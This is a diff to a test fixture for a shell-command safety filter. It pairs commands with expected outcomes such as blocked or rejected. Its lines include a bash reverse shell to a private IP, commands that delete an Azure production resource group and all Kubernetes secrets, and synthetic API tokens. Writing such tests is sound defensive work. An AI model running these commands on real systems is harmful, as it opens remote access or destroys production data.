@@ -48,3 +48,8 @@
 {"id": "dlp-21", "command": "echo '{\"type\": \"service_account\", \"project_id\": \"prod-app\"}'", "expected": "sensitive_rejected"}
 {"id": "dest-20", "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "expected": "destructive_blocked"}
 {"id": "safe-9", "command": "docker compose up -d", "expected": "pass_reflex"}
+{"id": "dlp-22", "command": "export SUPABASE_ACCESS_TOKEN=sbp_SYNTHETIC0123456789abcdef0123456789", "expected": "sensitive_rejected"}
+{"id": "dlp-23", "command": "export TWILIO_API_KEY=SK_SYNTHETIC_0123456789abcdef012", "expected": "sensitive_rejected"}
+{"id": "dest-21", "command": "az group delete --name production-core-rg --yes --no-wait", "expected": "destructive_blocked"}
+{"id": "dest-22", "command": "kubectl delete secret --all -n production", "expected": "destructive_blocked"}
+{"id": "safe-10", "command": "az group show --name production-core-rg", "expected": "pass_reflex"}
